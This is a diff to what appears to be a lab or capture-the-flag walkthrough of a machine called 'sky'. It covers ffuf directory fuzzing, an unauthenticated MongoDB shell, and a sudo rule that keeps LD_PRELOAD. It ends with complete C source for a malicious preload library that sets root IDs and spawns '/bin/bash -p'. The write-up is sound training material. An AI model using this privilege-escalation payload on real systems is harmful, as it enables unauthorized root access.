@@ -9,8 +9,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 80   | HTTP    |
+| 22 | SSH |
+| 80 | HTTP |
 
 
 
@@ -40,33 +40,33 @@ Seems like there is a `v2` directory which may contain some sort of login page, 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.167.2/FUZZ" -ic -c -t 200 -e .php,.html,.git
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.167.2/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .php .html .git
+ :: Method : GET
+ :: URL : http://10.10.167.2/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions : .php .html .git
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 184ms]
-index.html              [Status: 200, Size: 19607, Words: 2975, Lines: 540, Duration: 184ms]
-.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 184ms]
-assets                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 173ms]
-career.html             [Status: 200, Size: 9289, Words: 1509, Lines: 254, Duration: 173ms]
-v2                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 172ms]
+.html [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 184ms]
+index.html [Status: 200, Size: 19607, Words: 2975, Lines: 540, Duration: 184ms]
+.php [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 184ms]
+assets [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 173ms]
+career.html [Status: 200, Size: 9289, Words: 1509, Lines: 254, Duration: 173ms]
+v2 [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 172ms]
 ```
 
 
@@ -194,25 +194,25 @@ Questions? Try the MongoDB Developer Community Forums
 	https://community.mongodb.com
 ---
 The server generated these startup warnings when booting:
-        2025-05-02T19:24:29.566+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
-        2025-05-02T19:25:08.352+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
+ 2025-05-02T19:24:29.566+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
+ 2025-05-02T19:25:08.352+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
 ---
 ---
-        Enable MongoDB's free cloud-based monitoring service, which will then receive and display
-        metrics about your deployment (disk utilization, CPU, operation statistics, etc).
+ Enable MongoDB's free cloud-based monitoring service, which will then receive and display
+ metrics about your deployment (disk utilization, CPU, operation statistics, etc).
 
-        The monitoring data will be available on a MongoDB website with a unique URL accessible to you
-        and anyone you share the URL with. MongoDB may use this information to make product
-        improvements and to suggest MongoDB products and deployment options to you.
+ The monitoring data will be available on a MongoDB website with a unique URL accessible to you
+ and anyone you share the URL with. MongoDB may use this information to make product
+ improvements and to suggest MongoDB products and deployment options to you.
 
-        To enable free monitoring, run the following command: db.enableFreeMonitoring()
-        To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
+ To enable free monitoring, run the following command: db.enableFreeMonitoring()
+ To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
 ---
 > show dbs
-admin   0.000GB
-backup  0.000GB
-config  0.000GB
-local   0.000GB
+admin 0.000GB
+backup 0.000GB
+config 0.000GB
+local 0.000GB
 >
 ```
 
@@ -254,10 +254,10 @@ If we use `sudo -l`, we notice this:
 ```
 webdeveloper@sky:~$ sudo -l
 Matching Defaults entries for webdeveloper on sky:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+ env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
 
 User webdeveloper may run the following commands on sky:
-    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
+ (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
 ```
 
 There's a strange binary on here, the interesting stuff on here is the:
@@ -266,7 +266,7 @@ There's a strange binary on here, the interesting stuff on here is the:
 LD_PRELOAD
 ```
 
-LD_PRELOAD is an environment variable in Linux that allows users to specify a shared library (.so file) to be loadedÂ _before_Â all other system libraries during program execution. This mechanism is typically used for debugging or overriding specific functions in existing libraries. However, in a security context, it can be abused for privilege escalation if an attacker controls theÂ `LD_PRELOAD`Â variable and can execute a binary with elevated privileges (e.g., via sudo). By crafting a malicious shared library that defines functions with the same names as those used by the target binary (e.g.,Â `system()`,Â `exec()`, or even constructor functions), an attacker can hijack the programâ€™s execution flow. When the binary runs, it loads the attackerâ€™s library first, executing arbitrary code with the privileges of the target process, in this case, rootâ€”due to theÂ `sudo`Â permissions granted toÂ `/usr/bin/sky_backup_utility`.
+LD_PRELOAD is an environment variable in Linux that allows users to specify a shared library (.so file) to be loaded _before_ all other system libraries during program execution. This mechanism is typically used for debugging or overriding specific functions in existing libraries. However, in a security context, it can be abused for privilege escalation if an attacker controls the`LD_PRELOAD` variable and can execute a binary with elevated privileges (e.g., via sudo). By crafting a malicious shared library that defines functions with the same names as those used by the target binary (e.g.,`system()`,`exec()`, or even constructor functions), an attacker can hijack the programâ€™s execution flow. When the binary runs, it loads the attackerâ€™s library first, executing arbitrary code with the privileges of the target process, in this case, rootâ€”due to the`sudo` permissions granted to`/usr/bin/sky_backup_utility`.
 
 
 Knowing all this, we can get a root shell by doing this:
@@ -279,27 +279,27 @@ Knowing all this, we can get a root shell by doing this:
 #include <unistd.h>
 
 #define BOLD "\033[1m"
-#define RED  "\033[31m"
+#define RED "\033[31m"
 #define RESET "\033[0m"
 
 void _init() {
-    fprintf(stderr, BOLD RED"[+]" RESET" Unsetting LD_PRELOAD\n");
-    unsetenv("LD_PRELOAD");
+ fprintf(stderr, BOLD RED"[+]" RESET" Unsetting LD_PRELOAD\n");
+ unsetenv("LD_PRELOAD");
 
-    fprintf(stderr, BOLD RED"[+]" RESET" Setting EUID/EGID to 0\n");
-    if(setgid(0) < 0) { 
-        perror("setgid"); 
-        _exit(1); 
-    }
-    if(setuid(0) < 0) { 
-        perror("setuid"); 
-        _exit(1); 
-    }
-    
-    fprintf(stderr, BOLD RED"[+]" RESET" Spawning root shell!\n");
-    system("/bin/bash -p");
-    fprintf(stderr, BOLD RED"[!]" RESET" Shell execution failed!\n");
-    _exit(0);
+ fprintf(stderr, BOLD RED"[+]" RESET" Setting EUID/EGID to 0\n");
+ if(setgid(0) < 0) { 
+ perror("setgid"); 
+ _exit(1); 
+ }
+ if(setuid(0) < 0) { 
+ perror("setuid"); 
+ _exit(1); 
+ }
+ 
+ fprintf(stderr, BOLD RED"[+]" RESET" Spawning root shell!\n");
+ system("/bin/bash -p");
+ fprintf(stderr, BOLD RED"[!]" RESET" Shell execution failed!\n");
+ _exit(0);
 }
 ```
 
